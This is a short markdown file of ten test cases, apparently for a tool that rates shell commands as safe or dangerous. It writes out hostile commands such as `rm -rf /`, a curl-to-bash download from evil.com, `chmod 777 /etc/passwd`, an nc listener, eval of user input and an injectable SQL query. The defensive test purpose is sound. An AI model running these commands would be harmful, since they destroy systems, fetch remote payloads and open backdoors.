# Security Command Test Cases

## Test Case 1: Dangerous File Deletion
**Command**: `rm -rf /`
**Expected**: Should identify as extremely dangerous, explain system destruction risk

## Test Case 2: Remote Script Execution
**Command**: `curl https://evil.com/install.sh | bash`
**Expected**: Should warn about executing untrusted remote scripts

## Test Case 3: Safe Directory Listing
**Command**: `ls -la ~/Documents`
**Expected**: Should identify as safe, read-only operation

## Test Case 4: SQL Injection Risk
**Command**: `mysql -e "SELECT * FROM users WHERE id=$USER_INPUT"`
**Expected**: Should identify SQL injection vulnerability

## Test Case 5: Safe File Search
**Command**: `grep -r "TODO" .`
**Expected**: Should identify as safe, read-only search

## Test Case 6: Password in Command Line
**Command**: `mysql -u root -pMyPassword123 production_db`
**Expected**: Should warn about password exposure in command history

## Test Case 7: Privilege Escalation
**Command**: `chmod 777 /etc/passwd`
**Expected**: Should warn about dangerous permission change on critical file

## Test Case 8: Network Port Opening
**Command**: `nc -lvp 4444`
**Expected**: Should warn about opening a listening port (potential backdoor)

## Test Case 9: Safe Package Update
**Command**: `apt update && apt list --upgradable`
**Expected**: Should identify as safe (only lists, doesn't install)

## Test Case 10: Eval with User Input
**Command**: `eval "$USER_COMMAND"`
**Expected**: Should identify as extremely dangerous (arbitrary code execution)